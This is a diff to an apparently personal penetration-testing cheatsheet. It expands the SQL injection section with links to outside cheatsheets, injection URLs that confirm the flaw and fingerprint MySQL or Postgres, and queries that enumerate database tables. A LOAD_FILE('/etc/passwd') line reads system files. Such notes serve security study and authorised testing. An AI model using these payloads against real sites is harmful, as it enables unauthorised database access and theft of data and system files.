@@ -187,22 +187,41 @@ Another LFI / LFI->RCE Cheatsheet:
 
 ---
 ### SQL Injection
----
+---  
+SQL Cheatsheet: http://www.cheat-sheets.org/sites/sql.su/  
+DB Specific SQLi Cheatsheets: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+Confirm vulnerability: `http://targetsite.com/price.php?id=2   ->   http://targetsite.com/price.php?id=1+1`
 
-SQL Cheatsheet: http://www.cheat-sheets.org/sites/sql.su/
-
-Enumerate DB metadata via. 'INFORMATION_SCHEMA' view:
+DB fingerprinting techniques:
 ```
-information_schema
-SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST
-SELECT * FROM INFORMATION_SCHEMA.TABLES
+MySQL                                                              // FINGERPRINTING:        
+   http://www.example.com/news.php?id=1 /*! AND 1=1 */--           // via. comments
+   http://www.example.com/news.php?id=1 AND 'aa'=CONCAT('a','a')   // via. MySQL CONCAT()
+   http://www.example.com/news.php?id=1 AND 1=2 UNION SELECT 1, 2, @@version  // via. db version
+
+Postgres
+   http://www.example.com/news.php?id=1 AND 1=1::int               // via. typecast
+   http://www.example.com/news.php? id=1 AND 'a'='a'||'a'          // via. Postgres concat
+
+If !MySQL and !Postgres, most likely SQLite:
+   http://www.sqlitetutorial.net/sqlite-cheat-sheet   OR
+   https://d17h27t6h515a5.cloudfront.net/topher/2016/September/57ed880e_sql-sqlite-commands-cheat-sheet/sql-sqlite-commands-cheat-sheet.pdf
+```
+
+Enumerate DB metadata via. views:
+```
+MySQL (db.information_schema)
+  SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
+  SELECT * FROM INFORMATION_SCHEMA.TABLES;
+  
+Sqlite (db.sqlite_master)
+  SELECT name FROM sqlite_master WHERE type='table';
 ```
 
 Read files:
 ```
 SELECT LOAD_FILE('/etc/passwd');
 ```
-
 
 Logic Alternatives:
 ```
